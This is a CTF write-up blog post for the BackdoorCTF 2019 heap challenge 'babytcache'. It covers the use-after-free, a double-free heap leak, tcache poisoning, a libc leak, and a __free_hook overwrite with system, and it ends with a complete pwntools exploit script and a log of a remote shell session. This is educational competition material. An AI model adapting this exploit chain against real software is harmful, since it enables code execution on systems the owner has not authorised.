---
layout: post
title:  "BackdoorCTF 2019: babytcache"
date:   2019-10-27 23:30:00 +0800
categories: pwn
tags: BackdoorCTF
---

I played this CTF with 0x1 and got 6th place.

This was a very trivial tcache challenge.

TL;DR:

1. Leak a heap address using double free.
2. Tcache poisoning attack to get a chunk right in the `tcache_perthread_struct` structure at the beginning of the heap.
3. Overwrite the count of 0x80 tcache bin to 7.
4. Free a 0x80 chunk to get a libc leak.
5. Tcache poisoning attack again to overwrite `__free_hook` to `system`.
6. Free a chunk whose first 8 bytes are `'/bin/sh\x00'` for shell.

### Challenge

> At least let me free 7 tcaches.
>
> [http://backdoor.static.beast.sdslabs.co/static/babytcache/babytcache](http://backdoor.static.beast.sdslabs.co/static/babytcache/babytcache)
>
>[http://backdoor.static.beast.sdslabs.co/static/babytcache/libc.so.6](http://backdoor.static.beast.sdslabs.co/static/babytcache/libc.so.6)
>
>`nc 51.158.118.84 17002`
>
>Flag format: CTF{...}
>
>Created by: [Nipun Gupta](https://backdoor.sdslabs.co/users/fs0ciety)
>
>No. of Correct Submissions: 18

### Solution

I won't go into too much detail about the solution, as it is very simple in my opinion. If you do have any questions, feel free to DM me on twitter or email me.

#### Reverse Engineering

Running the binary gives us the following menu:
```
----------BABYTCACHE----------
1) Add note
2) Edit note
3) Free note
4) View note
5) Exit
>> 
```

When reverse engineering the binary, we note three things. The first is that there is global variable that I named `free_limit`. It is initially set to 5 and decremented after every free, meaning we only get 5 frees total.

Second, there is a UAF in the `free_note` function since the global `notes` array does not have it's indexes zeroed out after each free:
```c
void free_note()
{
  int result;
  int temp;
  int idx;

  puts("Note index:");
  result = read_int();
  idx = result;
  if (result >= 0 && result <= 7)
  {
    if (notes_array[result])
    {
      temp = free_limit--;
      if ( !temp )
      {
        puts("Sorry no more removal\n");
        exit(0);
      }
      free(notes_array[idx]);
      puts("done");
    }
    else
    {
      puts("This Note is empty");
    }
  }
}
```

Finally, as a consequence of the UAF, we see in the `add_note` function that we are only allowed to allocate a maximum of 8 chunks:
```c
void add_note()
{
  int result;
  int idx;

  puts("Note index:");
  result = read_int();
  idx = result;
  while ( idx >= 0 && idx <= 7 )
  {
    if ( notes_array[idx] )
      return puts("This note is occupied\n");
    puts("Note size:");
    notes_size_array[idx] = read_int();
    if ( (notes_size_array[idx] & 0x80000000) == 0 && notes_size_array[idx] <= 0x200 )
    {
      notes_array[idx] = malloc(notes_size_array[idx]);
      if ( !notes_array[idx] )
        exit(0);
      puts("Note data:");
      return read_data(notes_array[idx], notes_size_array[idx]);
    }
    puts("Invalid size");
  }
}
```

This tells us one thing: in order to get a libc leak, we can't do the classic "Fill a tcache bin with 7 chunks and the 8th free will go into the unsorted bin and provide a leak", since we are limited to 5 frees.

#### Steps to solve

I initially set up three chunks and did a double free to get a heap leak as follows:
```python
add(0, 0x80, 'A'*0x80) # Used for heap leak
add(1, 0x80, 'A'*0x80) # Used for libc leak
add(2, 0x80, 'A'*0x80) # Prevent consolidation with top
free(0)
free(0)
show(0)

heap = u64(p.recvline().split(':')[1].strip().ljust(8, '\x00')) - 0x260
log.info('Heap base: ' + hex(heap))
```

With the heap leak, I got a chunk inside the `tcache_perthread_structure` and overwrote the size value of the 0x80 tcache bin to make it look like its full:
```python
# Tcache poisoning attack
edit(0, p64(heap+0x10))
add(3, 0x80, 'A'*0x80)
add(4, 0x80, p64(0x0700000000000000))
```

Freeing the chunk at index 1 will now send it to the unsorted bin and provide us a libc leak:
```python
# Leak libc
free(1)
show(1)

libc.address = u64(p.recvline().split(':')[1].strip().ljust(8, '\x00')) - 0x3ebca0
log.info('Libc base: ' + hex(libc.address))
```

Then I simply edited the chunk that we already had in the `tcache_perthread_struct` and made the 0x80 tcache bin pointer point to `__free_hook`, and then overwrote `__free_hook` with `system`:
```python
edit(4, '\x00'*0x78 + p64(libc.sym['__free_hook']))
add(5, 0x80, p64(libc.sym['system']))
```

Finally, I edited chunk 0 to make its first 8 bytes `'/bin/sh\x00'` and freed it to get a shell:
```python
edit(0, '/bin/sh\x00')
free(0)

p.interactive()
```
```sh
vagrant@ubuntu-bionic:/ctf/practice/backdoorctf/babytcache$ ./exploit.py REMOTE
[*] '/ctf/practice/backdoorctf/babytcache/babytcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/practice/backdoorctf/babytcache/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
REMOTE PROCESS
[+] Opening connection to 51.158.118.84 on port 17002: Done
[*] Heap base: 0x55de298cb000
[*] Libc base: 0x7fbf7f248000
[*] Switching to interactive mode
$ ls
Dockerfile
babytcache
babytcache.c
beast.toml
flag.txt
post-build.sh
public
setup.sh
$ cat flag.txt
CTF{REDACTEDREDACTEDREDACTED}
$ 
```

### Full Exploit

```python
#!/usr/bin/env python2

from pwn import *

BINARY = './babytcache'
HOST, PORT = '51.158.118.84', 17002

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def start():
  if not args.REMOTE:
    print "LOCAL PROCESS"
    return process(BINARY)
  else:
    print "REMOTE PROCESS"
    return remote(HOST, PORT)

def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)


def add(idx, size, data):
  p.sendlineafter('>> ', '1')
  p.sendlineafter(':\n', str(idx))
  p.sendlineafter(':\n', str(size))
  p.sendafter(':\n', data)

def edit(idx, data):
  p.sendlineafter('>> ', '2')
  p.sendlineafter(':\n', str(idx))
  p.sendlineafter(':\n', data)

def free(idx):
  p.sendlineafter('>> ', '3')
  p.sendlineafter(':\n', str(idx))

def show(idx):
  p.sendlineafter('>> ', '4')
  p.sendlineafter(':\n', str(idx))

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

p = start()
if args.GDB:
  debug([])

add(0, 0x80, 'A'*0x80) # Used for heap leak
add(1, 0x80, 'A'*0x80) # Used for libc leak
add(2, 0x80, 'A'*0x80) # Prevent consolidation with top
free(0)
free(0)
show(0)

heap = u64(p.recvline().split(':')[1].strip().ljust(8, '\x00')) - 0x260
log.info('Heap base: ' + hex(heap))

# Tcache poisoning attack
edit(0, p64(heap+0x10))
add(3, 0x80, 'A'*0x80)
add(4, 0x80, p64(0x0700000000000000))

# Leak libc
free(1)
show(1)

libc.address = u64(p.recvline().split(':')[1].strip().ljust(8, '\x00')) - 0x3ebca0
log.info('Libc base: ' + hex(libc.address))

edit(4, '\x00'*0x78 + p64(libc.sym['__free_hook']))
add(5, 0x80, p64(libc.sym['system']))

edit(0, '/bin/sh\x00')
free(0)

p.interactive()
```